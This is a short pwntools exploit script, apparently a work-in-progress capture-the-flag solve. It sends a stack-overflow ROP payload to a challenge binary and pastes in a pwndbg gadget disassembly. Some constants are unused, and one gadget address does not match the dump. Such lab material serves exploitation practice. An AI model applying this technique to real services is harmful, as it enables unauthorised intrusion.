from pwn import *
from ctftools.pwn.common import connect

exe = ELF("vuln_patched")
io = connect(exe, "host", 1337)

offset = 0x28
pop_rbp_gadget = 0x40115D  # pop rbp ; ret
mov_rbp_rsp_gadget = 0x40117a # push rbp ; mov rbp, rsp ; pop rcx ; ret
call_print_addr = exe.symbols.main + 66
ret = 0x40101A


payload = flat(
    b'A' * offset,
    mov_rbp_rsp_gadget,
    exe.symbols.main
)
io.sendline(payload)
io.recvuntil(payload[:5])
io.recvline()

io.interactive()

"""
pwndbg> disass gadgets
Dump of assembler code for function gadgets:
   0x0000000000401176 <+0>:     endbr64 
   0x000000000040117a <+4>:     push   rbp
   0x000000000040117b <+5>:     mov    rbp,rsp
   0x000000000040117e <+8>:     pop    rcx
   0x000000000040117f <+9>:     ret    
   0x0000000000401180 <+10>:    nop
   0x0000000000401181 <+11>:    pop    rbp
   0x0000000000401182 <+12>:    ret    
End of assembler dump.
"""
